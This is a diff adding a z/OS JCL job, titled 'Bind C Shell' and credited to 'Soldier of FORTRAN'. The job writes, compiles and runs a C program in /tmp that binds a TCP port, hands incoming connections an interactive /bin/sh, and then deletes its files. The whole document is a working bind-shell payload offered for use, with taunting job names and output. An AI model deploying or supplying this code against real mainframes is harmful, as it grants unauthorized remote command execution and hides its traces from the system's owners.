@@ -1,0 +1,49 @@
+//EVIL##05  JOB (JOB),'Bind C Shell',CLASS=A,MSGCLASS=0,
+//           NOTIFY=&SYSUID,MSGLEVEL=(1,1)
+//* JCL To create a C shell and binds to port
+//* Creates files in /tmp and deletes them when you exit
+//* by Soldier of FORTRAN
+//CREATECS  EXEC PGM=IEBGENER
+//SYSPRINT  DD SYSOUT=*
+//SYSIN     DD DUMMY
+//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
+//             PATHDISP=(KEEP,DELETE),
+//             FILEDATA=TEXT,
+//             PATH='/tmp/<userid>.c'
+//SYSUT1    DD DATA,DLM=##
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+int main(int argc, char *argv )
+{
+ int result , sockfd;
+ int port;
+ struct sockaddr_in sin;
+ sockfd = socket(AF_INET,SOCK_STREAM,0);
+ sin.sin_family = AF_INET;
+ sin.sin_addr.s_addr = 0;
+ sin.sin_port = htons(555<user>);
+ bind (sockfd,(struct sockaddr *)&sin,sizeof(sin));
+ listen(sockfd,5);
+ result = accept (sockfd,NULL,0);
+ dup2(result,2);
+ dup2(result,1);
+ dup2(result,0);
+ printf("MeSs wItH tH3 Be5t D1E lIkE tHe Re5t\n");
+ execl("/bin/sh","sh",NULL);
+return EXIT_SUCCESS;
+}
+##
+//OMGLOL    EXEC PGM=BPXBATCH,REGION=800M
+//STDPARM   DD *
+SH cd /tmp;
+cc -o /tmp/<userid> /tmp/<userid>.c;
+/tmp/<userid>;
+rm /tmp/<userid>.o;
+rm /tmp/<userid>.c;
+rm /tmp/<userid>;
+/*
